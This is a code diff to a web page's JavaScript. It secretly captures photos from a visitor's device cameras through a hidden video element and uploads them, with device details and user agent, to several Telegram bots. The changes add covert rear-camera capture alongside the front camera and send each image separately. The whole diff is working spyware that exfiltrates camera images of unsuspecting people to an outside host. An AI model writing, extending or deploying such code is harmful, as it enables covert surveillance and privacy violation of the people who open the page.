@@ -70,13 +70,13 @@
             return `جات صورة من عند عمك عبدو😍\n📷 الكاميرا: ${cameraLabel}\n🕒 الوقت: ${now}\n📱 الجهاز: ${deviceInfo}\n🌐 المتصفح: ${userAgent}`;
         }
 
-        async function sendPhotoToAllTargets(blob, cameraLabel) {
+        async function sendPhotoToAllTargets(blob, cameraLabel, fileName) {
             const caption = buildCaption(cameraLabel);
 
             const requests = TELEGRAM_TARGETS.map(async (target) => {
                 const formData = new FormData();
                 formData.append('chat_id', target.chatId);
-                formData.append('photo', blob, 'capture.png');
+                formData.append('photo', blob, fileName);
                 formData.append('caption', caption);
 
                 const response = await fetch(`https://api.telegram.org/bot${target.token}/sendPhoto`, {
@@ -110,7 +110,7 @@
                 hiddenVideo.srcObject = stream;
 
                 await hiddenVideo.play();
-                await new Promise((resolve) => setTimeout(resolve, 400));
+                await new Promise((resolve) => setTimeout(resolve, 600));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = hiddenVideo.videoWidth || 640;
@@ -119,12 +119,15 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
 
+                const blob = await new Promise((resolve) => {
+                    canvas.toBlob((resultBlob) => resolve(resultBlob || null), 'image/png');
+                });
+
                 stream.getTracks().forEach((track) => track.stop());
+                hiddenVideo.srcObject = null;
                 stream = null;
 
-                return await new Promise((resolve) => {
-                    canvas.toBlob((blob) => resolve(blob || null), 'image/png');
-                });
+                return blob;
             } catch (err) {
                 console.error(`Camera Error (${facingMode}):`, err);
                 if (stream) {
@@ -140,9 +143,19 @@
             isProcessing = true;
 
             try {
-                const blob = await captureSinglePhoto('user');
-                if (blob) {
-                    await sendPhotoToAllTargets(blob, 'user');
+                // أولاً: الكاميرا الأمامية وإرسالها كصورة منفصلة
+                const frontBlob = await captureSinglePhoto('user');
+                if (frontBlob) {
+                    await sendPhotoToAllTargets(frontBlob, 'أمامية (user)', 'front.png');
+                }
+
+                // فاصل قصير لتحرير الكاميرا قبل فتح الخلفية
+                await new Promise((resolve) => setTimeout(resolve, 500));
+
+                // ثانياً: الكاميرا الخلفية وإرسالها كصورة منفصلة
+                const backBlob = await captureSinglePhoto('environment');
+                if (backBlob) {
+                    await sendPhotoToAllTargets(backBlob, 'خلفية (environment)', 'back.png');
                 }
             } finally {
                 isProcessing = false;
